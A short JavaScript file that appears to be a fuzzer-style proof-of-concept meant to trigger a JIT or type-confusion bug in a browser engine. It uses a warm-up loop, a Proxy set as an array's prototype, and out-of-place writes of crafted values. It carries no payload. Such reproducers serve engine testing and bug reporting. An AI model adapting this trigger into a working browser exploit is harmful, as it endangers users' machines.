function memset(a1, a2, a3) {
    for (let i5 = 0; i5 < a3; i5++) {
        a1[i5] = a2;
    }
}
function trigger(a11, a12) {
    let tmp = [1];
    a11?.length;
    let v17;
    try { v17 = tmp.concat(a12); } catch (e) {}
    let res = v17;
    a11[0] = 4660;
    a11[1] = 0;
}
function main() {
    let v25;
    try { v25 = new Array(100); } catch (e) {}
    let v26;
    try { v26 = v25.fill(1); } catch (e) {}
    let tmp = v26;
    for (let i29 = 0; i29 < 500; i29++) {
        const v36 = tmp?.length;
        try { memset(tmp, 1, v36); } catch (e) {}
        const v39 = [1];
        try { trigger(tmp, v39); } catch (e) {}
    }
    const v41 = () => {
        let buggy = [1];
        let arr = [1,2];
        arr.getPrototypeOf = Object?.prototype?.valueOf;
        const v53 = {};
        let v54;
        try { v54 = new Proxy(v53, arr); } catch (e) {}
        buggy.__proto__ = v54;
        const v56 = -524286;
        try { memset(buggy, v56, 1); } catch (e) {}
        try { trigger(arr, buggy); } catch (e) {}
        try { alert(arr); } catch (e) {}
    };
    try { setTimeout(v41, 100); } catch (e) {}
}
try { main(); } catch (e) {}
